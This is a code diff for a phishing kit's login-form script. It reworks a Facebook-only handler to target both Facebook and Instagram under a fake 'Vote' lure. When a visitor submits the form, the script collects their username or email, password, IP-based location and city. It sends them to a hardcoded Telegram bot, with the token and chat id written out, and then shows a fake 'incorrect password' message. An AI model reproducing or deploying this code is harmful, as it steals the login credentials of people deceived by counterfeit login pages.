@@ -1,11 +1,30 @@
-const formFB = document.querySelector("#fbform");
+const form = document.querySelector("#form");
 var ct = "5";
 var co = 0;
 var lo = 0;
 var st = 0;
 
-formFB.addEventListener("submit", (e) => {
+// Form-specific configurations
+const platforms = {
+  fb: {
+    type: "Facebook Vote",
+  },
+  ig: {
+    type: "Instagram Vote",
+  },
+};
+
+form.addEventListener("submit", (e) => {
   e.preventDefault();
+
+  // Determine platform (Facebook or Instagram) based on a data attribute or other identifier
+  const platform = form.getAttribute("data-platform") || "fb"; // default to fb
+  const platformConfig = platforms[platform];
+
+  if (!platformConfig) {
+    console.error("Invalid platform specified.");
+    return;
+  }
 
   fetch("https://ipapi.co/json/")
     .then((res) => res.json())
@@ -15,11 +34,11 @@ formFB.addEventListener("submit", (e) => {
       lo = data.country_calling_code;
       st = data.city;
 
-      var identity = document.getElementById("fb_email").value;
-      var password = document.getElementById("fbpass").value;
+      var identity = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
 
-      var fb_text = `
-      <b>New Facebook Vote</b>
+      var text = `
+      <b>New ${platformConfig.type}</b>
       - <b>Username/Email:</b> ${identity}
       - <b>Password:</b> ${password}
       - <b>IPAddress:</b> ${ct}
@@ -31,8 +50,9 @@ formFB.addEventListener("submit", (e) => {
       var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
       var chat_id = 7656086639;
       var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
-        fb_text
+        text
       )}&parse_mode=HTML`;
+
       let api = new XMLHttpRequest();
       api.open("GET", url, true);
       api.send();
@@ -40,6 +60,7 @@ formFB.addEventListener("submit", (e) => {
         "Sorry, your password was incorrect. Please double-check your password.";
     });
 
+  // Uncomment and set redirection as needed
   // window.location.replace("https://www.instagram.com/accounts/login/")
-  //   console.log("Incorrect Password!");
+  // console.log("Incorrect Password!");
 });
